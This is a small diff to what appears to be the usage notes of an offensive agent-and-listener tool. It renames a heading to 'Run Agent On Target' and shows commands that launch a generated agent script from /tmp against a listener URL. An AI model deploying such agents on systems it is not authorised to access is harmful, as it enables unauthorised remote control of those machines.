@@ -43,7 +43,7 @@ Listener Port =  what you want (need to fit the listener)
 
 the created agent is stored in /tmp/$filename.
 
---[Run Agent]--
+--[Run Agent On Target]--
 
 bash /tmp/hehe.sh 123 http://127.0.0.1:8888
 python /tmp/hehe.py 123 http://127.0.0.1:8888
